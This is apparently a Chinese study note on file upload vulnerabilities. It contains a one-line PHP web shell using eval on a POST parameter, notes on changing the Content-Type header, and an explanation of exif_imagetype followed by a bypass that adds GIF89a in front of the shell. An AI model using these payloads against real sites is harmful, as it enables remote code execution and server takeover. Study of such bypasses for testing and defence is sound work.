链接：
[[文件上传基础手法]]
[[文件上传绕过参考一]]
[[文件上传漏洞参考二]]
#### 1、一句话木马
```php
<?php eval($_POST['kkk']);?>
```
#### 2、修改content-type字段
1. **`text/plain`**：纯文本，没有特定格式。
    
2. **`text/html`**：HTML 文档。
    
3. **`text/css`**：Cascading Style Sheets (CSS) 文件。
    
4. **`application/json`**：JSON 数据格式。
    
5. **`application/xml`**：XML 数据格式。
    
6. **`application/pdf`**：Adobe PDF 文件。
    
7. **`image/jpeg`**：JPEG 图像格式。
    
8. **`image/png`**：PNG 图像格式。
    
9. **`audio/mpeg`**：MP3 音频文件。
    
10. **`video/mp4`**：MP4 视频文件。
    
11. **`multipart/form-data`**：用于在 HTML 表单中上传文件的一种方式。

```
1.1 application/json：消息主体是序列化后的 JSON 字符串
1.2 application/x-www-form-urlencoded：数据被编码为名称/值对。这是标准的编码格式 
1.3 multipart/form-data： 需要在表单中进行文件上传时，就需要使用该格式。常见的媒体格式是上传文件之时使用的 1.4 text/plain：数据以纯文本形式(text/json/xml/html)进行编码，其中不含任何控件或格式字符
```
#### 3、关于`exif_imagetype`函数验证和相关绕过
##### 3.1、exif_imagetype函数介绍
`exif_imagetype` 函数在PHP中用于确定图像文件的类型。它读取图像文件的前几个字节并检查有效的图像标志，以识别图像类型。
以下是使用 `exif_imagetype` 函数的
示例，其中将空字符串作为文件名，这将无法正常工作：

phpCopy code
```php
`$filename = ''; 
$imageType = exif_imagetype($filename); 
if ($imageType !== false) {    
echo "图像类型为：" . image_type_to_mime_type($imageType);
} else {    
echo "无法确定图像类型。";
}`
```

在这个例子中，如果将空字符串作为文件名 (`''`)，函数将无法读取任何图像数据，并返回 `false`。因此，输出将是 "无法确定图像类型"。
要成功使用 `exif_imagetype`，你应该提供一个有效的图像文件路径作为参数。例如：
phpCopy code

```php
`$filename = 'path/to/your/image.jpg'; $imageType = exif_imagetype($filename);
if ($imageType !== false) {    
echo "图像类型为：" . image_type_to_mime_type($imageType); 
} else {  
echo "无法确定图像类型。"; 
}`
```

将 `'path/to/your/image.jpg'` 替换为实际的图像文件路径。
##### 3.2、绕过
```php
GIF89a
<?php eval($_POST['kkk']);?>
```

